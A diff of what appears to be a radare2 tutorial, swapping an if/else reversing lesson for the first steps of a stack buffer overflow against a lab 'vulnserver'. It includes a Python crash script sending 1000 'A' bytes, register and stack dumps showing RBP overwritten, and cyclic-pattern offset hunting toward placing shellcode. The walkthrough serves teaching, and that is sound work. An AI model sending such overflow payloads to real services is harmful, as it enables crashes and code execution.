-│           0x080484ea b    8d45f0         lea eax, [input]
-│           0x080484ed      50             push eax
-│           0x080484ee      68f3850408     push 0x80485f3
-│           0x080484f3 b    e8a8feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
-│           0x080484f8 b    83c410         add esp, 0x10
-│           0x080484fb      8b45f0         mov eax, dword [input]
-│           0x080484fe      85c0           test eax, eax
-~~~
-So after the PRINTF call, some stack adjustment is done and then we see that the address of one of the variables we saw on top of the code is loaded into eax (one can name it something like "input" with afvn for pure logical reasons), then eax is pushed to the stack for being passed as a parameter (we can guess) to the SCANF function, a memory address is pushed to the stack as well, in this case we can see that this address contains the string ("please enter...:").  
-If we move after the first breakpoint, we can inspect the registers and see how the address is loaded:
-~~~
-[0x080484ed]> dr
-eax = 0xbfa9a688
-ebx = 0x00000000
-ecx = 0x0910b01a
-edx = 0xb7f0c870
-esi = 0xb7f0b000
-edi = 0xb7f0b000
-esp = 0xbfa9a678
-ebp = 0xbfa9a698
-eip = 0x080484ed
-eflags = 0x00000296
-oeax = 0xffffffff
-~~~
-Then we can move to the next breakpoint and inspect the stack, we will see how those two parameters are appear there:
-~~~
-[0x080484ed]> dc
-hit breakpoint at: 80484f3
-[0x080484f3]> pxr @ esp
-0xbfa9a670 0x080485f3  .... @esp (/home/lab/c_examples/bin/ifelse) (.rodata) program R X 'and eax, 0x6f590064' 'ifelse' (%d)
-0xbfa9a674 0xbfa9a688  .... ([stack]) stack R W 0xbfa9a74c -->  ([stack]) stack R W 0xbfa9c288 -->  ([stack]) stack R W 0x5f474458 (XDG_VTNR=7) -->  ascii ('X')
-0xbfa9a678 0xb7d87a50  Pz.. (/lib/i386-linux-gnu/libc-2.23.so) library R X 'add ebx, 0x1835b0' 'libc-2.23.so'
-0xbfa9a67c 0x080485ab  .... (/home/lab/c_examples/bin/ifelse) (.text) sym.__libc_csu_init program R X 'add edi, 1' 'ifelse'
-0xbfa9a680 0x00000001  .... 1 (.comment)
-0xbfa9a684 0xbfa9a744  D... ([stack]) stack R W 0xbfa9c27f -->  ([stack]) stack R W 0x66692f2e (./ifelse) -->  ascii ('.')
-~~~
-Then if we hit the next breakpoint one more time, the program will ask for a value and will then hit the last breakpoint:
-~~~
-[0x080484f3]> dc
-Enter an integer: 10
-hit breakpoint at: 80484f8
-[0x080484f8]> 
-~~~
-If we inspect the registers, we will see how EAX is set with the value 0x00000001, that means the SCANF call executed properly without any major problem.
-~~~
-[0x080484f8]> dr
-eax = 0x00000001
-ebx = 0x00000000
-ecx = 0x00000001
-edx = 0xb7f0c87c
-esi = 0xb7f0b000
-edi = 0xb7f0b000
-esp = 0xbfa9a670
-ebp = 0xbfa9a698
-eip = 0x080484f8
-eflags = 0x00000246
-oeax = 0xffffffff
-[0x080484f8]> 
-~~~
-So at that point we can now examine the address of the "input" variable and we will see how the number (10 in our case) is stored there in hex format.
-~~~
-[0x080484f8]> pxw @ 0xbfa9a688
-0xbfa9a688  0x0000000a 0x630f3300 0xb7f0b3dc 0xbfa9a6b0  .....3.c........
-~~~
-We can even make sure of it by using rax2 to convert it to base10.
-~~~
-[0x080484f8]> rax2 0xa
-10
-~~~
-At that point of the program, we have our input value properly stored, after that, the program will have to check whether that value is positive or negative and move the execution to one place or another depending on that.  
-
-So we can set another breakpoint right before "the first arrow" related to the execution flow. As arrows may not always appear (that always will depend on the disasm/framework you are using), another way to detect "switch points" on the execution flow is to look for JLE, JE and instructions like that.  
-~~~
-[0x080484f8]> 
-
-
-│           0x080484f8 b    83c410         add esp, 0x10
-│           0x080484fb      8b45f0         mov eax, dword [input]
-│           0x080484fe      85c0           test eax, eax
-│       ┌─< 0x08048500      7e16           jle 0x8048518
-│       │   0x08048502      8b45f0         mov eax, dword [input]
-│       │   0x08048505      83ec08         sub esp, 8
-~~~
-So we basically see that the "10"base10 value is loaded into EAX and then a test instruction is executed:  
-After the test instruction is used, the flag registers status is the following:
-~~~
-[0x08048500]> dr 1
-cf = 0x00000000
-pf = 0x00000001
-af = 0x00000000
-zf = 0x00000000
-sf = 0x00000000
-tf = 0x00000000
-if = 0x00000001
-df = 0x00000000
-of = 0x00000000
-~~~
-And basically, the TEST instruction sets ZF(Zero flag) and SF(Sign flag) based on a logical AND between the operands, and clears OF(Overflow flag). So in this case those flags will be set to zero. Then the instruction JLE means JUMP (to the memory address that is indicated right after) If less than and "Less than" is defined as: ZF=1 or SF != OF  
-
-So we can see that if we reload the program and enter a negative number the SF flag will get activated:
-~~~
-[0x080484bb]> db 0x08048500
-[0x080484bb]> dc
-Enter an integer: -20
-hit breakpoint at: 8048500
-[0x08048500]> dr 1
-cf = 0x00000000
-pf = 0x00000000
-af = 0x00000000
-zf = 0x00000000
-sf = 0x00000001
-tf = 0x00000000
-if = 0x00000001
-df = 0x00000000
-of = 0x00000000
-[0x08048500]> 
-And one more time, as we enter a positive number the SF flag will not be activated.
-[0x080484bb]> db 0x08048500
-[0x080484bb]> dc
-Enter an integer: 20
-hit breakpoint at: 8048500
-[0x08048500]> dr 1
-cf = 0x00000000
-pf = 0x00000001
-af = 0x00000000
-zf = 0x00000000
-sf = 0x00000000
-tf = 0x00000000
-if = 0x00000001
-df = 0x00000000
-of = 0x00000000
-[0x08048500]> 
-~~~
-Then after that, the program will basically jump to a memory address that will print "positive" or to another one printing "negative" then move or jump (with jmp) to the end of the program and thus the program will end.
-
-#### The 64 bit version
-The 64 bit is prettyy the same, can you note the differences? Basically registers(esi, rdi..) are being used to pass parameters instead of the stack! Also, memory addresses are 64 bits.
-~~~
-[0x7f584b7b9090]> sf main
-[0x561302d2871a]> pdf
+```
+radare2 -dAAA vulnserver 8081
+``` 
+Then as usual we can inspect the functions:
+```
+[0x000009b0]> afl
+0x00000000    2 64           sym.imp.__libc_start_main
+0x00000878    3 23           sym._init
+0x000008a0    1 6            sym.imp.recv
+0x000008b0    1 6            sym.imp.strcpy
+0x000008c0    1 6            sym.imp.puts
+0x000008d0    1 6            sym.imp.strlen
+0x000008e0    1 6            sym.imp.htons
+0x000008f0    1 6            sym.imp.send
+0x00000900    1 6            sym.imp.printf
+0x00000910    1 6            sym.imp.close
+0x00000920    1 6            sym.imp.strcmp
+0x00000930    1 6            sym.imp.fflush
+0x00000940    1 6            sym.imp.listen
+0x00000950    1 6            sym.imp.bind
+0x00000960    1 6            sym.imp.accept
+0x00000970    1 6            sym.imp.atoi
+0x00000980    1 6            sym.imp.exit
+0x00000990    1 6            sym.imp.socket
+0x000009a0    1 6            sub.__cxa_finalize_248_9a0
+0x000009b0    1 43           entry0
+0x000009e0    4 50   -> 40   sym.deregister_tm_clones
+0x00000a20    4 66   -> 57   sym.register_tm_clones
+0x00000a70    4 49           sym.__do_global_dtors_aux
+0x00000ab0    1 10           entry1.init
+0x00000aba    1 59           sym.egg
+0x00000af5    3 73           sym.checkAuth
+0x00000b3e   11 395          sym.handleConnection
+0x00000cc9    8 221          sym.start
+0x00000da6    4 88           main
+0x00000e00    4 101          sym.__libc_csu_init
+0x00000e70    1 2            sym.__libc_csu_fini
+0x00000e74    1 9            sym._fini
+[0x000009b0]> 
+```
+And jump to main to start seeing what it does:
+```
+[0x000009b0]> s 0x00000da6
+[0x00000da6]> pdf
             ;-- main:
-/ (fcn) main 161
+/ (fcn) main 88
 |   main ();
-|           ; var int local_ch @ rbp-0xc
-|           ; var int local_8h @ rbp-0x8
-|              ; DATA XREF from 0x561302d2862d (entry0)
-|           0x561302d2871a      55             push rbp
-|           0x561302d2871b      4889e5         mov rbp, rsp
-|           0x561302d2871e      4883ec10       sub rsp, 0x10
-|           0x561302d28722      64488b042528.  mov rax, qword fs:[0x28] ; [0x28:8]=-1 ; '(' ; 40
-|           0x561302d2872b      488945f8       mov qword [local_8h], rax
-|           0x561302d2872f      31c0           xor eax, eax
-|           0x561302d28731      488d3d100100.  lea rdi, qword str.Enter_an_integer: ; 0x561302d28848 ; "Enter an integer: "
-|           0x561302d28738      b800000000     mov eax, 0
-|           0x561302d2873d      e89efeffff     call sym.imp.printf     ; int printf(const char *format)
-|           0x561302d28742      488d45f4       lea rax, qword [local_ch]
-|           0x561302d28746      4889c6         mov rsi, rax
-|           0x561302d28749      488d3d0b0100.  lea rdi, qword [0x561302d2885b] ; "%d"
-|           0x561302d28750      b800000000     mov eax, 0
-|           0x561302d28755      e896feffff     call sym.imp.__isoc99_scanf
-|           0x561302d2875a      8b45f4         mov eax, dword [local_ch]
-|           0x561302d2875d      85c0           test eax, eax
-|       ,=< 0x561302d2875f      7e18           jle 0x561302d28779
-|       |   0x561302d28761      8b45f4         mov eax, dword [local_ch]
-|       |   0x561302d28764      89c6           mov esi, eax
-|       |   0x561302d28766      488d3df10000.  lea rdi, qword str.You_entered__d. ; 0x561302d2885e ; "You entered %d.\n"
-|       |   0x561302d2876d      b800000000     mov eax, 0
-|       |   0x561302d28772      e869feffff     call sym.imp.printf     ; int printf(const char *format)
-|      ,==< 0x561302d28777      eb16           jmp 0x561302d2878f
-|      |`-> 0x561302d28779      8b45f4         mov eax, dword [local_ch]
-|      |    0x561302d2877c      89c6           mov esi, eax
-|      |    0x561302d2877e      488d3deb0000.  lea rdi, qword str.You_entered_a_negative_number__d. ; 0x561302d28870 ; "You entered a negative number %d.\n"
-|      |    0x561302d28785      b800000000     mov eax, 0
-|      |    0x561302d2878a      e851feffff     call sym.imp.printf     ; int printf(const char *format)
-|      |       ; JMP XREF from 0x561302d28777 (main)
-|      `--> 0x561302d2878f      488d3dfd0000.  lea rdi, qword str.The_if_statement_is_easy. ; 0x561302d28893 ; "The if statement is easy."
-|           0x561302d28796      b800000000     mov eax, 0
-|           0x561302d2879b      e840feffff     call sym.imp.printf     ; int printf(const char *format)
-|           0x561302d287a0      b800000000     mov eax, 0
-|           0x561302d287a5      488b55f8       mov rdx, qword [local_8h]
-|           0x561302d287a9      644833142528.  xor rdx, qword fs:[0x28]
-|       ,=< 0x561302d287b2      7405           je 0x561302d287b9
-|       |   0x561302d287b4      e817feffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
-|       `-> 0x561302d287b9      c9             leave
-\           0x561302d287ba      c3             ret
-[0x561302d2871a]> 
-~~~
-See you in the next one :)
+|           ; var int local_10h @ rbp-0x10
+|           ; var int local_4h @ rbp-0x4
+|              ; DATA XREF from 0x000009cd (entry0)
+|           0x00000da6      55             push rbp                    ; vulns.c:209 int main(int argc, char* argv[]) {
+|           0x00000da7      4889e5         mov rbp, rsp
+|           0x00000daa      4883ec10       sub rsp, 0x10
+|           0x00000dae      897dfc         mov dword [local_4h], edi
+|           0x00000db1      488975f0       mov qword [local_10h], rsi
+|           0x00000db5      837dfc02       cmp dword [local_4h], 2     ; vulns.c:210   if (argc != 2) { ; [0x2:4]=0x102464c
+|       ,=< 0x00000db9      7422           je 0xddd
+|       |   0x00000dbb      488b45f0       mov rax, qword [local_10h]  ; vulns.c:211     printf("Usage: %s PORT \n", argv[0]);
+|       |   0x00000dbf      488b00         mov rax, qword [rax]
+|       |   0x00000dc2      4889c6         mov rsi, rax
+|       |   0x00000dc5      488d3de20500.  lea rdi, qword str.Usage:__s_PORT ; 0x13ae ; "Usage: %s PORT \n" ; const char * format
+|       |   0x00000dcc      b800000000     mov eax, 0
+|       |   0x00000dd1      e82afbffff     call sym.imp.printf         ; int printf(const char *format)
+|       |   0x00000dd6      b800000000     mov eax, 0                  ; vulns.c:212     return 0;
+|      ,==< 0x00000ddb      eb1f           jmp 0xdfc
+|      ||      ; JMP XREF from 0x00000db9 (main)
+|      |`-> 0x00000ddd      488b45f0       mov rax, qword [local_10h]  ; vulns.c:215   start(atoi(argv[1]));
+|      |    0x00000de1      4883c008       add rax, 8
+|      |    0x00000de5      488b00         mov rax, qword [rax]
+|      |    0x00000de8      4889c7         mov rdi, rax                ; const char * str
+|      |    0x00000deb      e880fbffff     call sym.imp.atoi           ; int atoi(const char *str)
+|      |    0x00000df0      89c7           mov edi, eax
+|      |    0x00000df2      e8d2feffff     call sym.start
+|      |    0x00000df7      b800000000     mov eax, 0                  ; vulns.c:217   return 0;
+|      |       ; JMP XREF from 0x00000ddb (main)
+|      `--> 0x00000dfc      c9             leave                       ; vulns.c:218 }
+\           0x00000dfd      c3             ret
+[0x00000da6]> 
+```
+And we will quickly see that the main is basically used for the program initialization, params loading and such and to quickly jump to "start()", so we move there:
+```
+[0x00000da6]> s 0x00000cc9
+[0x00000cc9]> pdf
+/ (fcn) sym.start 221
+|   sym.start ();
+|           ; var int local_24h @ rbp-0x24
+|           ; var int local_20h @ rbp-0x20
+|           ; var int local_1eh @ rbp-0x1e
+|           ; var int local_1ch @ rbp-0x1c
+|           ; var int local_4h @ rbp-0x4
+|              ; CALL XREF from 0x00000df2 (main)
+|           0x00000cc9      55             push rbp                    ; vulns.c:170 void start(int port) {
+|           0x00000cca      4889e5         mov rbp, rsp
+|           0x00000ccd      4883ec30       sub rsp, 0x30               ; '0'
+|           0x00000cd1      897ddc         mov dword [local_24h], edi
+|           0x00000cd4      ba06000000     mov edx, 6                  ; vulns.c:174   sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+|           0x00000cd9      be01000000     mov esi, 1
+|           0x00000cde      bf02000000     mov edi, 2
+|           0x00000ce3      e8a8fcffff     call sym.imp.socket
+|           0x00000ce8      8945fc         mov dword [local_4h], eax
+|           0x00000ceb      837dfc00       cmp dword [local_4h], 0     ; vulns.c:175   if (sock < 0) {
+|       ,=< 0x00000cef      7916           jns 0xd07
+|       |   0x00000cf1      488d3d610600.  lea rdi, qword str.Error_opening_socket ; vulns.c:176     printf("Error opening socket\n"); ; 0x1359 ; "Error opening socket" ; const char * s
+|       |   0x00000cf8      e8c3fbffff     call sym.imp.puts           ; int puts(const char *s)
+|       |   0x00000cfd      bfffffffff     mov edi, 0xffffffff         ; vulns.c:177     exit(-1); ; -1 ; int status
+|       |   0x00000d02      e879fcffff     call sym.imp.exit           ; void exit(int status)
+|       |      ; JMP XREF from 0x00000cef (sym.start)
+|       `-> 0x00000d07      8b45dc         mov eax, dword [local_24h]  ; vulns.c:180   server.sin_port = htons(port);
+|           0x00000d0a      0fb7c0         movzx eax, ax
+|           0x00000d0d      89c7           mov edi, eax
+|           0x00000d0f      e8ccfbffff     call sym.imp.htons
+|           0x00000d14      668945e2       mov word [local_1eh], ax
+|           0x00000d18      c745e4000000.  mov dword [local_1ch], 0    ; vulns.c:181   server.sin_addr.s_addr = INADDR_ANY;
+|           0x00000d1f      66c745e00200   mov word [local_20h], 2     ; vulns.c:182   server.sin_family = AF_INET;
+|           0x00000d25      488d4de0       lea rcx, qword [local_20h]  ; vulns.c:184   if (bind(sock, (struct sockaddr*) &server, sizeof(server)) < 0) {
+|           0x00000d29      8b45fc         mov eax, dword [local_4h]
+|           0x00000d2c      ba10000000     mov edx, 0x10               ; rdx
+|           0x00000d31      4889ce         mov rsi, rcx
+|           0x00000d34      89c7           mov edi, eax
+|           0x00000d36      e815fcffff     call sym.imp.bind
+|           0x00000d3b      85c0           test eax, eax
+|       ,=< 0x00000d3d      7916           jns 0xd55
+|       |   0x00000d3f      488d3d280600.  lea rdi, qword str.Error_binding_socket ; vulns.c:185     printf("Error binding socket\n"); ; 0x136e ; "Error binding socket" ; const char * s
+|       |   0x00000d46      e875fbffff     call sym.imp.puts           ; int puts(const char *s)
+|       |   0x00000d4b      bfffffffff     mov edi, 0xffffffff         ; vulns.c:186     exit(-1); ; -1 ; int status
+|       |   0x00000d50      e82bfcffff     call sym.imp.exit           ; void exit(int status)
+|       |      ; JMP XREF from 0x00000d3d (sym.start)
+|       `-> 0x00000d55      8b45fc         mov eax, dword [local_4h]   ; vulns.c:189   if (listen(sock, 5) == -1) {
+|           0x00000d58      be05000000     mov esi, 5
+|           0x00000d5d      89c7           mov edi, eax
+|           0x00000d5f      e8dcfbffff     call sym.imp.listen
+|           0x00000d64      83f8ff         cmp eax, 0xff
+|       ,=< 0x00000d67      7516           jne 0xd7f
+|       |   0x00000d69      488d3d130600.  lea rdi, qword str.Error_listening ; vulns.c:190     printf("Error listening\n"); ; 0x1383 ; "Error listening" ; const char * s
+|       |   0x00000d70      e84bfbffff     call sym.imp.puts           ; int puts(const char *s)
+|       |   0x00000d75      bfffffffff     mov edi, 0xffffffff         ; vulns.c:191     exit(-1); ; -1 ; int status
+|       |   0x00000d7a      e801fcffff     call sym.imp.exit           ; void exit(int status)
+|       |      ; JMP XREF from 0x00000d67 (sym.start)
+|       `-> 0x00000d7f      488d3d0d0600.  lea rdi, qword str.Waiting_for_connections... ; vulns.c:194   printf("Waiting for connections...\n"); ; 0x1393 ; "Waiting for connections..." ; const char * s
+|           0x00000d86      e835fbffff     call sym.imp.puts           ; int puts(const char *s)
+|              ; JMP XREF from 0x00000da4 (sym.start)
+|       .-> 0x00000d8b      488b057e1220.  mov rax, qword [obj.stdout] ; vulns.c:197     fflush(stdout); ; loc.stdout ; [0x202010:8]=0
+|       :   0x00000d92      4889c7         mov rdi, rax                ; FILE *stream
+|       :   0x00000d95      e896fbffff     call sym.imp.fflush         ; int fflush(FILE *stream)
+|       :   0x00000d9a      8b45fc         mov eax, dword [local_4h]   ; vulns.c:198     handleConnection(sock);
+|       :   0x00000d9d      89c7           mov edi, eax
+|       :   0x00000d9f      e89afdffff     call sym.handleConnection
+\       `=< 0x00000da4      ebe5           jmp 0xd8b                   ; vulns.c:197     fflush(stdout);
+[0x00000cc9]> 
+```
+Then in start, a seasoned exploiter will quickly jump and identify the "recv" function as something potentially dangerous:
+```
+:135   recv_size = recv(fd, secret_buffer, 1024, 0);
+|           0x00000bcd      8b45fc         mov eax, dword [local_4h]
+|           0x00000bd0      b900000000     mov ecx, 0
+|           0x00000bd5      ba00040000     mov edx, 0x400
+|           0x00000bda      89c7           mov edi, eax
+|           0x00000bdc      e8bffcffff     call sym.imp.recv
+|           0x00000be1      8945ec         mov dword [local_14h], eax
+|           0x00000be4      837dec00       cmp dword [local_14h], 0    ; vulns.c:137   if (recv_size <= 0) {
+|       ,=< 0x00000be8      7f1b           jg 0xc05
+|       |   0x00000bea      488d3d270700.  lea rdi, qword str.Connection_close ; vulns.c:138     printf("Connection close!\n"); ; 0x1318 ; "Connection
+```
+At this point, the normal thing is to start paying attention to functions that actually receive data "from the outside" and place it somewhere on memory. One of the main problems in here can be an actual buffer overflow. How to identify it? We can debug the program while sending a big chunk of information (example: >1000bytes) and see where and how it gets placed in memory. We can also quickly inspect the stack and start to think about the space we have and how our buffer won't fit in there:
+
+So we set some breakpoints in here:
+```
+db 0x555555554b3e
+db 0x555555554c5a
+
+s 0x555555554b3e
+```
+And then we can use some simple python script to send that buffer, like this:
+```
+import socket
+import sys
+
+payload = b"\x41"*1000  
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect = s.connect(('127.0.0.1',8081))
+s.send(payload)
+
+s.close()
+``` 
+We start the program and allow the execution with "dc"
+```
+[0x555555554b3e]> dc
+Waiting for connections...
+hit breakpoint at: 555555554b3e
+[0x555555554b3e]> dc
+Got connection!
+child stopped with signal 11
+[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
+[0x555555554b3d]> 
+```
+And after the buffer gets sent by recv we see how the program crashes. After a program crash we need to start focusing on two things mainly, especially in situations like this one. The state of the registers and the Stack. We'll need to see what registers we can control and if/what space in memory do we have to place shellcode in it:
+```
+[0x555555554b3d]> dr
+rax = 0x41414141
+rbx = 0x00000000
+rcx = 0x7ffff7a985d0
+rdx = 0x00000059
+r8 = 0x00000000
+r9 = 0x00000000
+r10 = 0x00000000
+r11 = 0x7ffff7b912c0
+r12 = 0x5555555549b0
+r13 = 0x7fffffffe0b0
+r14 = 0x00000000
+r15 = 0x00000000
+rsi = 0x5555555552a0
+rdi = 0x7fffffffdae0
+rsp = 0x7fffffffdb18
+rbp = 0x4141414141414141
+rip = 0x555555554b3d
+rflags = 0x00010286
+orax = 0xffffffffffffffff
+[0x555555554b3d]> 
+```
+So we inspect the registers and the stack and we see that we can control a decent amount of space as well as we have full control of RBP, nice!
+```
+[0x555555554b3d]> dr rbp
+0x4141414141414141
+[0x555555554b3d]> 
+
+[0x555555554b3d]> pxw @ rsp-100
+0x7fffffffdab4  0x00007fff 0x00000000 0x00000000 0x00000000  ................
+0x7fffffffdac4  0x00000000 0x55554b2e 0x00005555 0x0000000f  .....KUUUU......
+0x7fffffffdad4  0x00000000 0xffffdb30 0x00007fff 0x41414141  ....0.......AAAA
+0x7fffffffdae4  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdaf4  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb04  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb14  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb24  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb34  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb44  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb54  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb64  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb74  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb84  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdb94  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+0x7fffffffdba4  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
+[0x555555554b3d]> 
+```
+So right now two things can be done, the first one, to identify a space in memory to place our shellcode, the second one to identify the position in which we override our registers, being RBP one of interest.
+
+We can use some tool like [The pattern generator script](https://github.com/Svenito/exploit-pattern) to generate a pattern of chars to send as "fuzzing", then we can use the same script to identify the positions in which we overwrite memory:
+```
+lab@lab-VirtualBox:~/exploit-pattern$ python3 pattern.py 1000
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+```
+So we generate and launch the pattern:
+```
+lab@lab-VirtualBox:~/exploit-pattern$ nc localhost 8081
+Welcome! Please enter the secret text:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+```
+And then we inspect the registers again:
+```
+[0x555555554b3d]> dr
+rax = 0x35624134
+rbx = 0x00000000
+rcx = 0x4232684231684230
+rdx = 0x00000059
+r8 = 0x00000000
+r9 = 0x00000000
+r10 = 0x00000000
+r11 = 0x7ffff7b912c0
+r12 = 0x5555555549b0
+r13 = 0x7fffffffe0b0
+r14 = 0x00000000
+r15 = 0x00000000
+rsi = 0x5555555552a0
+rdi = 0x7fffffffdae0
+rsp = 0x7fffffffdb18
+rbp = 0x6241376241366241
+rip = 0x555555554b3d
+rflags = 0x00010286
+orax = 0xffffffffffffffff
+
+[0x555555554b3d]> pxw 300 @ rsp 
+0x7fffffffdb18  0x39624138 0x41306341 0x63413163 0x33634132  8Ab9Ac0Ac1Ac2Ac3
+0x7fffffffdb28  0x41346341 0x63413563 0x37634136 0x41386341  Ac4Ac5Ac6Ac7Ac8A
+0x7fffffffdb38  0x64413963 0x31644130 0x41326441 0x64413364  c9Ad0Ad1Ad2Ad3Ad
+0x7fffffffdb48  0x35644134 0x41366441 0x64413764 0x39644138  4Ad5Ad6Ad7Ad8Ad9
+0x7fffffffdb58  0x41306541 0x65413165 0x33654132 0x41346541  Ae0Ae1Ae2Ae3Ae4A
+0x7fffffffdb68  0x65413565 0x37654136 0x41386541 0x66413965  e5Ae6Ae7Ae8Ae9Af
+0x7fffffffdb78  0x31664130 0x41326641 0x66413366 0x35664134  0Af1Af2Af3Af4Af5
+0x7fffffffdb88  0x41366641 0x66413766 0x39664138 0x41306741  Af6Af7Af8Af9Ag0A
+0x7fffffffdb98  0x67413167 0x33674132 0x41346741 0x67413567  g1Ag2Ag3Ag4Ag5Ag
+0x7fffffffdba8  0x37674136 0x41386741 0x68413967 0x31684130  6Ag7Ag8Ag9Ah0Ah1
+0x7fffffffdbb8  0x41326841 0x68413368 0x35684134 0x41366841  Ah2Ah3Ah4Ah5Ah6A
+0x7fffffffdbc8  0x68413768 0x39684138 0x41306941 0x69413169  h7Ah8Ah9Ai0Ai1Ai
+0x7fffffffdbd8  0x33694132 0x41346941 0x69413569 0x37694136  2Ai3Ai4Ai5Ai6Ai7
+0x7fffffffdbe8  0x41386941 0x6a413969 0x316a4130 0x41326a41  Ai8Ai9Aj0Aj1Aj2A
+0x7fffffffdbf8  0x6a41336a 0x356a4134 0x41366a41 0x6a41376a  j3Aj4Aj5Aj6Aj7Aj
+0x7fffffffdc08  0x396a4138 0x41306b41 0x6b41316b 0x336b4132  8Aj9Ak0Ak1Ak2Ak3
